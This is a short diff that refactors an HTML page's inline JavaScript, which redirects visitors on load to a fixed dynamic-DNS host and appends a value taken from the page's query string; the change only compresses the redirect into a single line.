@@ -4,9 +4,7 @@
 <meta charset="utf-8"/>
 <script type="text/javascript">
 document.addEventListener("DOMContentLoaded", function() {
-    var str = window.location.href;
-    var query = [...str.split('=')][2]
-    document.location.href = "https://nanick.hopto.org/" + query;
+    document.location.href = "https://nanick.hopto.org/" + window.location.search.split('=')[2];
 });
 </script>
 </head>
